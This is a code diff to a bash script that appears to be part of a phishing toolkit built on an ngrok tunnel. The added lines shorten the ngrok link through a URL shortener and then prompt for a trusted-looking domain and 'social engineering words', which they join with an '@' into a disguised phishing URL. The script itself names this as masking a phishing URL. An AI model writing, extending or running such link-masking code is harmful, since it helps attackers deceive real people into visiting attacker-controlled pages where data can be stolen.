@@ -187,7 +187,20 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+
+short=$(curl -s https://da.gd/s/?url=${link})
+shorter=${short#https://}
+echo -e "\n\e[1;77m[\e[0m+\e[1;92m] Masking Domain \e[0m"
+echo "Domain to mask the Phishing URL (with http or https), ex https://google.com, http
+://anything.org) : "
+echo -en "\e[32m=>\e[0m "
+read mask
+echo -e '\n\e[1;77mType social engineering words:(like free-money, best-pubg-tricks)'
+echo -e "\n\e[1;77mDon't use space just use '-' between social engineering words\e[0m"
+echo -en "\e[32m=>\e[0m "
+read words
+final=$mask-$words@$shorter
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $final
 
 payload_ngrok
 checkfound
